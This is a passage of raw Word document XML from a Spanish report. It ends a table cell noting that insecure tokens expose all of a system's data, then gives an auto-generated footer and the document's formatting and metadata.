            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="20"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
              <w:br/>
              <w:t>Debe ser parte integral del diseño desde el primer día. Un token inseguro no es</w:t>
            </w:r>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="20"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
              <w:br/>
              <w:t>un problema menor — es la puerta de entrada a todos los datos del sistema.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4ECAA60C" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00FF500C">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4F50E776" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00FF500C">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6DCC702F" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:color w:val="808080"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Documento generado automáticamente · 14/05/2026 01:09</w:t>
      </w:r>
    </w:p>
    <w:sectPr w:rsidR="00FF500C" w:rsidRPr="00AB674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47423993">
    <w:abstractNumId w:val="8"/>
  </w:num>
  <w:num w:numId="2" w16cid:durableId="1867253035">
    <w:abstractNumId w:val="6"/>
  </w:num>
  <w:num w:numId="3" w16cid:durableId="1620332213">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="4" w16cid:durableId="1949239950">
    <w:abstractNumId w:val="4"/>
  </w:num>
  <w:num w:numId="5" w16cid:durableId="1430202115">
    <w:abstractNumId w:val="7"/>
  </w:num>
  <w:num w:numId="6" w16cid:durableId="1680423649">
    <w:abstractNumId w:val="3"/>
  </w:num>
  <w:num w:numId="7" w16cid:durableId="1453326694">
    <w:abstractNumId w:val="2"/>
  </w:num>
  <w:num w:numId="8" w16cid:durableId="550464203">
    <w:abstractNumId w:val="1"/>
  </w:num>
  <w:num w:numId="9" w16cid:durableId="1062676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3214"/>
    <w:rsid w:val="0029639D"/>
    <w:rsid w:val="00326F90"/>
    <w:rsid w:val="00AA1D8D"/>
    <w:rsid w:val="00AB6745"/>
    <w:rsid w:val="00B47730"/>
    <w:rsid w:val="00CB0664"/>
    <w:rsid w:val="00F1105C"/>
    <w:rsid w:val="00FC693F"/>
    <w:rsid w:val="00FF50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AB7805"/>
  <w14:defaultImageDpi w14:val="300"/>
  <w15:docId w15:val="{81D9363D-1B18-46F7-B842-1AB4CE31E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20</Pages>
  <Words>3098</Words>
  <Characters>17041</Characters>
  <Application>Microsoft Office Word</Application>
  <DocSecurity>0</DocSecurity>
  <Lines>142</Lines>
  <Paragraphs>40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20099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the bultrex</cp:lastModifiedBy>
  <cp:revision>2</cp:revision>
  <cp:lastPrinted>2026-05-14T06:20:00Z</cp:lastPrinted>
  <dcterms:created xsi:type="dcterms:W3CDTF">2013-12-23T23:15:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-05-14T06:25:00Z</dcterms:modified>
  <cp:category/>
</cp:coreProperties>
</file>